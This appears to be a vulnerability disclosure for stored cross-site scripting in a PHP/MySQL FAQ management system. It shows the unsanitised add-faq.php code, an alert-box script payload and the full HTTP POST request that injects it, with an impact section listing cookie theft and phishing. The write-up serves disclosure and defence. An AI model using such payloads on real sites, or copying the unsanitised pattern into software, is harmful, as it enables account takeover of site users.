## Vulnerability Details

**Credits**: 
> Reigz Macolor (https://github.com/reigz/)<br/>

**Tested On**:
> [FAQ Management System Using PHP and MySQL 1.0](https://www.sourcecodester.com/php/17175/faq-management-system-using-php-and-mysql-source-code.html) <br/>

**Affected Version**:
> FAQ Management System Using PHP and MySQL 1.0

**Affected Site Page**: 
> /faq-management-system/endpoint/add-faq.php<br/>

**Affected Code**: 
> </add-faq.php> <br/>

There is no input sanitization present when writing FAQs, making the web application vulnerable to XSS.

```php
<?php
include("../conn/conn.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['question'], $_POST['answer'])) {
        $question = $_POST['question'];
        $answer = $_POST['answer'];


        try {
            $stmt = $conn->prepare("INSERT INTO tbl_faq (question, answer) VALUES (:question, :answer)");
            
            $stmt->bindParam(":question", $question, PDO::PARAM_STR);
            $stmt->bindParam(":answer", $answer, PDO::PARAM_STR);

            $stmt->execute();

            header("Location: http://localhost/faq-management-system/");

            exit();
        } catch (PDOException $e) {
            echo "Error:" . $e->getMessage();
        }

    } else {
        echo "
            <script>
                alert('Please fill in all fields!');
                window.location.href = 'http://localhost/faq-management-system/';
            </script>
        ";
    }
}
?>
```

**Related CWE:**
> [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)

## **Details:**
> Allows XSS by placing untrusted code on the parameters `question` and `answer`.

Payload used is `%3Cscript%3Ealert%28%27reigz+was+here%27%29%3C%2Fscript%3E` for both parameters.

```http 
POST /faq-management-system/endpoint/add-faq.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 133
Connection: close

question=%3Cscript%3Ealert%28%27reigz+was+here%27%29%3C%2Fscript%3E&answer=%3Cscript%3Ealert%28%27reigz+was+here%27%29%3C%2Fscript%3E
```

![image](https://github.com/smurf-reigz/security/assets/48426940/563ad6be-0e81-4163-9ef9-8c130df16bcf)


## **Vulnerability Impact:**
> Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."
